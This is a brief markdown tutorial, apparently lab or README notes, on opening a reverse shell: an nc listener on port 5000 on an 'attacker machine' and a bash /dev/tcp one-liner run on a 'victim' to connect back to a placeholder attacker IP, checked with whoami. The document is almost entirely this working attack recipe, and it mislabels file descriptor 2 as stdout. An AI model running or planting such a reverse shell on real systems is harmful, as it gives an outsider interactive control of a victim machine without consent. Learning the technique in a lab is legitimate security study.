## Open a reverse shell on in shell application

1. In a UNIX/Ubuntu shell, run `nc -lvnp 5000` (Attacker machine)

- This tells the shell to open up port 5000 and wait/listen for a connection

2. In a separate UNIX/Ubuntu shell, run `bash -i >& /dev/tcp/<attacker_ip>/5000 0>&1` (Target/Victim machine)

- This creates a shell in interactive mode and redirects the stdout(1) and stdout(2) pipes to the specified network
- It then redirects stdin(0) from the network to stdout(1).

3. Your attacker machine should now have a shell to your victim machine. Run `whoami` on the attacker machine to verify that your machine's user is the same as the victim host that initiated the connection.

4. See demo image